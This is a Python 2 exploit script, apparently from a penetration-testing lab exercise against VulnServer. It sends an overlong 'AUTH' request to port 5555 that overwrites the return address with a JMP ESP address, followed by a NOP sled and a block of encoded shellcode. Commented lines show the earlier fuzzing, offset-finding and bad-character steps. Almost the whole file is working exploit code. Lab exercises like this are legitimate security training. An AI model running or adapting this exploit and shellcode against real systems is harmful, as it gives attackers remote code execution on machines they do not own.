#!/usr/bin/python
import time, struct, sys
import socket as so

# Exercise from 7.8.1, pg 174 in lab guide.

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

#req1 = "AUTH " + "\x41"*1072
#req1 = "AUTH " + "\x41"*1040 + "\x42"*4 + "\x43"*256 # 1300 bytes total
#req1 = "AUTH " + "\x41"*1040 + "\x42"*4 + "\x43"*360
#req1 = "AUTH " + "\x41"*1040 + "\x42"*4 + badchars
# Memory Location for VulnServer JMP ESP: 65D11D71   FFE4             JMP ESP

shellcode = ("\xba\x2d\xb4\x36\x67\xda\xc6\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x56\x12\x83\xc6\x04\x03\x7b\xba\xd4\x92\x7f\x2a\x9a"
"\x5d\x7f\xab\xfb\xd4\x9a\x9a\x3b\x82\xef\x8d\x8b\xc0\xbd\x21"
"\x67\x84\x55\xb1\x05\x01\x5a\x72\xa3\x77\x55\x83\x98\x44\xf4"
"\x07\xe3\x98\xd6\x36\x2c\xed\x17\x7e\x51\x1c\x45\xd7\x1d\xb3"
"\x79\x5c\x6b\x08\xf2\x2e\x7d\x08\xe7\xe7\x7c\x39\xb6\x7c\x27"
"\x99\x39\x50\x53\x90\x21\xb5\x5e\x6a\xda\x0d\x14\x6d\x0a\x5c"
"\xd5\xc2\x73\x50\x24\x1a\xb4\x57\xd7\x69\xcc\xab\x6a\x6a\x0b"
"\xd1\xb0\xff\x8f\x71\x32\xa7\x6b\x83\x97\x3e\xf8\x8f\x5c\x34"
"\xa6\x93\x63\x99\xdd\xa8\xe8\x1c\x31\x39\xaa\x3a\x95\x61\x68"
"\x22\x8c\xcf\xdf\x5b\xce\xaf\x80\xf9\x85\x42\xd4\x73\xc4\x0a"
"\x19\xbe\xf6\xca\x35\xc9\x85\xf8\x9a\x61\x01\xb1\x53\xac\xd6"
"\xb6\x49\x08\x48\x49\x72\x69\x41\x8e\x26\x39\xf9\x27\x47\xd2"
"\xf9\xc8\x92\x75\xa9\x66\x4d\x36\x19\xc7\x3d\xde\x73\xc8\x62"
"\xfe\x7c\x02\x0b\x95\x87\xc5\x3e\x61\x87\xae\x57\x77\x87\xd1"
"\x1c\xfe\x61\xbb\x72\x57\x3a\x54\xea\xf2\xb0\xc5\xf3\x28\xbd"
"\xc6\x78\xdf\x42\x88\x88\xaa\x50\x7d\x79\xe1\x0a\x28\x86\xdf"
"\x22\xb6\x15\x84\xb2\xb1\x05\x13\xe5\x96\xf8\x6a\x63\x0b\xa2"
"\xc4\x91\xd6\x32\x2e\x11\x0d\x87\xb1\x98\xc0\xb3\x95\x8a\x1c"
"\x3b\x92\xfe\xf0\x6a\x4c\xa8\xb6\xc4\x3e\x02\x61\xba\xe8\xc2"
"\xf4\xf0\x2a\x94\xf8\xdc\xdc\x78\x48\x89\x98\x87\x65\x5d\x2d"
"\xf0\x9b\xfd\xd2\x2b\x18\x1d\x31\xf9\x55\xb6\xec\x68\xd4\xdb"
"\x0e\x47\x1b\xe2\x8c\x6d\xe4\x11\x8c\x04\xe1\x5e\x0a\xf5\x9b"
"\xcf\xff\xf9\x08\xef\xd5")

#req1 = "AUTH " + "\x41"*1040 + "\x71\x1d\xd1\x65" + "\x43"*360
req1 = "AUTH " + "\x41"*1040 + "\x71\x1d\xd1\x65" + "\x90"*16  + shellcode + "\x43"*(400-351-16)
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
